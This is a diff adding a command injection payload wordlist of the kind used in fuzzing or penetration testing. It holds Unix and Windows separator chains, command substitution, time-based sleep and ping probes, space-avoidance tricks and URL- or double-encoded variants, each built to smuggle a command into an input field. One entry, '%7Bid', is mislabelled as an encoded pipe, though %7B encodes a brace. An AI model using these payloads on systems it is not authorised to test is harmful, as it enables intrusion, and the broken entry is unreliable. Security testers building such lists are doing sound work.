@@ -1,0 +1,49 @@
+# Command injection probe payloads - one per line, # lines are comments.
+# Semicolon chain (unix)
+;id
+# Pipe chain (unix)
+|id
+# AND chain (unix)
+&& id
+# OR chain (unix)
+|| id
+# Command substitution dollar paren
+$(id)
+# Command substitution backticks
+`id`
+# Newline injection (unix)
+%0aid
+# Semicolon with sleep (time-based)
+;sleep 5
+# Pipe with sleep
+|sleep 5
+# AND with sleep
+&& sleep 5
+# Dollar paren with sleep
+$(sleep 5)
+# Backtick with sleep
+`sleep 5`
+# Windows command separator
+&whoami
+# Windows double pipe
+||whoami
+# Windows AND
+&&whoami
+# Windows ping delay (time-based)
+|ping -n 5 127.0.0.1
+# Windows ping with caret
+^|ping -n 5 127.0.0.1
+# IFS bypass (no spaces)
+;id${IFS}-a
+# Tab bypass (no spaces)
+%09id
+# URL-encoded semicolon
+%3Bid
+# URL-encoded pipe
+%7Bid
+# URL-encoded newline
+%0a;id
+# Double-encoded semicolon
+%253Bid
+# Comment char to truncate (unix)
+id #
